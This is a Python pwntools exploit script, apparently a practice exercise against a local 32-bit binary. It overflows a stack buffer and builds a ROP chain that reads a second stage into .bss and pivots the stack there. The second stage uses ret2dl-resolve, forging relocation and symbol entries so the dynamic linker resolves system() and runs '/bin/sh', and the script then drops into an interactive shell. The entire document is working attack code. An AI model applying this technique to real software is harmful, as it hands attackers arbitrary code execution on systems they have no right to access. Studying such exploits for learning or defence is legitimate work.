#!/usr/bin/env python3
from pwn import *

elf = ELF("./01_m32-2")
rop = ROP(elf)

bufsize = int(sys.argv[1])

addr_plt_read = elf.plt["read"]     # objdump -d -j.plt a.out
addr_plt_write = elf.plt["write"]   # objdump -d -j.plt a.out

addr_bss = elf.bss()                # readelf -S a.out

addr_pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"]).address         # 0x080484cd: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
addr_pop_ebp = rop.find_gadget(["pop ebp", "ret"]).address                            # 0x08048433: pop ebp ; ret  ;  (3 found)
addr_leave_ret = rop.find_gadget(["leave", "ret"]).address                            # 0x08048461: leave  ; ret  ;  (2 found)

stack_size = 0x800
base_stage = addr_bss + stack_size

target = process("./01_m32-2")

buf = b'A' * bufsize
buf += b'AAAA' * 3
buf += p32(addr_plt_read)
buf += p32(addr_pop3)
buf += p32(0)
buf += p32(base_stage)
buf += p32(100)
buf += p32(addr_pop_ebp)
buf += p32(base_stage)
buf += p32(addr_leave_ret)

target.send(p32(len(buf)))
target.send(buf)
print("[+] read: %r" % target.recv(len(buf)))

# 2nd stage
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rel_plt = elf.get_section_by_name(".rel.plt").header.sh_addr
addr_dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
addr_dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
# write_rel_offset = 0x10
fake_rel_offset = (base_stage + 28) - addr_rel_plt
fake_sym_offset = (base_stage + 36) - addr_dynsym
align_dynsym = 0x10 - (fake_sym_offset & 0xf)
fake_sym_offset += align_dynsym
fake_r_info = (fake_sym_offset // 0x10) << 8 | 0x7 
addr_got_read = elf.got["read"]
st_name = (base_stage + 52 + align_dynsym) - addr_dynstr

cmd = b'/bin/sh\x00'

buf = b'AAAA'
buf += p32(addr_plt_start)
buf += p32(fake_rel_offset)
buf += p32(elf.symbols["main"])
# buf += p32(1)
buf += p32(base_stage+80)
# buf += p32(len(cmd))
buf += p32(0xdeadbeef)
buf += p32(0xdeadbeef)
buf += p32(addr_got_read)
buf += p32(fake_r_info)
buf += b"B" * align_dynsym
buf += p32(st_name)
buf += p32(0)
buf += p32(0)
buf += p32(0x12)
# buf += b"write\x00"
buf += b"system\x00"
buf += b'A' * (80-len(buf))
buf += cmd + b'\x00'
buf += b'A' * (100-len(buf))

_ = input()

target.send(buf)
# print("[+] read: %r" % target.recv(len(cmd)))

target.interactive()